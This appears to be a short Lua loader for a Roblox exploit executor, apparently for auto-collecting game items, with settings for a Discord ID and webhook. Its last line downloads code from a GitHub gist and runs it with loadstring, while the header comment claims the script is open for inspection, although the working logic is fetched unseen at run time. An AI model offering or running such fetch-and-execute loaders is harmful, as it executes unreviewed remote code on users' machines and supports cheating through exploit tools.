-- Open sourced. Feel free to look. 
-- ***Put in autoexec folder***
getgenv().Settings = {
["items"] = {"Lucky Arrow","Mysterious Arrow","Rokakaka"},
["DiscordId"] = 1234567890,
["customWebhook"] = "",
["PerformanceMode"] = false
}
repeat wait() until game:IsLoaded() and game.Players.LocalPlayer.PlayerGui
loadstring(syn.request({Url = "https://gist.githubusercontent.com/crcket/2496ba1f68f6bd6968e12282c8f6bb52/raw"}).Body)()